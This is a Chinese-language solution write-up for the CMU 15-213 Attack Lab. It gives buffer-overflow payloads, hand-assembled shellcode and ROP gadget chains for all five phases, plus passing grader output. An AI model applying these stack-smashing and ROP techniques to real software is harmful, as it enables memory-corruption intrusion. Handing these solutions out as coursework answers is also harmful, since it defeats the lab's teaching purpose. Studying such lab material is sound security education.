# CTARGET

> [!NOTE]
> 先看看`attacklab.pdf`，这是官方的提示
> 里面还有需要用到的汇编+hex
> little endian不要搞错了

---

## Phase 1

<details>
<summary>Assembly</summary>

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret

00000000004017c0 <touch1>: ...
```

</details>

很明显，getbuf只有0x28就是40的缓冲区，那只要40个垃圾数据+返回地址就行了

NB. 小段序，所以返回地址要倒着写 ie. `c0 17 40 00 00 00 00 00`

```bash
./hex2raw < ans/1.txt | ./ctarget -q
```

---

## Phase 2

从pdf中可以知道，不但要调用`touch2`，还要传入的`%rdi`与`cookie`相同

需要做的

1. buffer overflow，覆盖掉返回地址
2. 继续覆盖更多内容，植入自己的程序
3. `ret`返回到自己程序的开头
4. 自己程序设置好环境，再`ret touch2()`


地址高位

- code (设置`%rdi`，再把当前`%rsp`指向的地址改为`touch2`地址，然后`ret`)
- return addr
- getbuf garbage 40 bytes

地址低位

所以代码部分，就是设置好`touch()`返回地址+寄存器就行了

<details>
<summary>Assembly</summary>

```asm
0000000000000000 <.text>:
   0:   68 ec 17 40 00          push   $0x4017ec
   5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   c:   c3                      ret
```

</details>

代码部分就是 `68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3`

gdb可以发现，在`getbuf`返回之前`$rsp   : 0x000000005561dca0`

自己程序的开头就是 `%rsp+8 = 0x000000005561dca8`

---

## Phase 3

<details>
<summary>Assembly</summary>

```asm
00000000004018fa <touch3>: ...

0000000000000000 <.text>:
   0:   68 fa 18 40 00          push   $0x4018fa
   5:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   c:   c3                      ret
```

</details>

string形式的cookie `35 39 62 39 39 37 66 61 00` 长度是9

所以string的位置就是`%rsp+8`，因为跳过了返回地址

代码起始位置 `%rsp+8+9`，还跳过了string

ie. `0x5561DCB1` = little endian `b1 dc 61 55 00 00 00 00`

需要输入的字符 (40 bytes random) (ret addr) (string cookie) (code) 

... (b1 dc 61 55 00 00 00 00) (35 39 62 39 39 37 66 61 00) (68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3)

---

# RTARGET

---

## Phase 4

NB. 不要自己编译`farm.c`，因为你的结果可能和`rtarget`中不同；正确做法是在`rtarget`反编译的汇编中找到`start_farm()`到`end_farm()`的代码

phase 4只需要用到`start_farm()` `mid_farm()`

`nop = 0x90`

可以观察到

`58 90 c3`
```asm
4019cc:
   popq %rax
   nop
   ret
```

`48 89 c7 90 c7`
```asm
4019c5:
   movq %rax, %rdi
   nop
   ret
```

... (gadget 1) (cookie) (gadget 2) (touch2)

... (cc 19 40 00 00 00 00 00) (fa 97 b9 59 00 00 00 00) (c5 19 40 00 00 00 00 00) (ec 17 40 00 00 00 00 00)

---

### Phase 5

开启了ASLR，stack位置不固定，所以说不能直接放入地址，但是offset还是不变的

1. 整个farm能算加法的就一个 `lea (%rdi,%rsi,1),%rax`，所以`%rdi` `%rsi`有一个是base还有一个是offset

2. 可以发现，最终地址要存入`%rdi`，但是现在在`%rax`，所以需要找`48 89 c7 movq %rax,%rdi` （stack地址可能非常大，必须要用`q`指令）

3. farm里面没有现成的很小的数字作为offset，那只能从stack上面获取，搜索`5? popq ???`并且后面紧跟`ret`或者`(functional) nop`的语句

4. 用一连串寄存器，把偏移量从刚刚pop出来的`%rax`移到`%rdi`或`%rsi`，NB. offset很小，所以用`l` `q`并没有影响，找到哪个用哪个

5. 把`%rsp`也用类似的手法移动到`%rdi`或`%rsi`，这个数字比较大，只能用`q`

6. 计算offset要填入多少，最后组合字符串

<details>
<summary>Assembly</summary>

```asm
0000000000401a03 <addval_190>:
401a06:
   movq %rsp,%rax
   ret

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret

00000000004019a7 <addval_219>:
4019ab:
   popq %rax
   nop
   ret

00000000004019a0 <addval_273>:
4019a2:
   movq %rax,%rdi
   ret

0000000000401a33 <getval_159>:
401a34:
   movl %edx,%ecx
   cmpb %cl,%cl #nop
   ret

00000000004019db <getval_481>:
4019dd:
   movl %eax,%edx
   nop
   ret

0000000000401a11 <addval_436>:
401a13:
   movl %ecx,%esi
   nop
   nop
   ret
```

</details>

NB. 当`movq %rsp,%rax`的时候，`%rsp = 40 19 a2`不需要解释了，所以偏移量从`40 19 a2`算起


<details>
<summary>String</summary>

地址高位
```
string
40 18 fa
40 19 a2 (movq %rax,%rdi)
40 19 d6 (lea)
40 1a 13 (movl %ecx,%esi)
40 1a 34 (movl %edx,%ecx)
40 19 dd (movl %eax,%edx)
offset (8*9=72) (0x48)
40 19 ab (popq %rax)
40 19 a2 (movq %rax,%rdi)
40 1a 06 (movq %rsp,%rax)
```
低位


换成小端+调整顺序就这样
```
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
````

</details>

---

# Result

✌️ ezzzzz passed in only 2 days ✌️

💯 100/100

<details>
<summary>Check results</summary>

ALL phases defeated

```bash
➜  attack git:(main) ✗ ./hex2raw < ans/1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
➜  attack git:(main) ✗ ./hex2raw < ans/2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 A8 DC 61 55 00 00 00 00 68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 
➜  attack git:(main) ✗ ./hex2raw < ans/3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 B1 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 
➜  attack git:(main) ✗ ./hex2raw < ans/4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
➜  attack git:(main) ✗ ./hex2raw < ans/5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
➜  attack git:(main) ✗ 
```

</details>
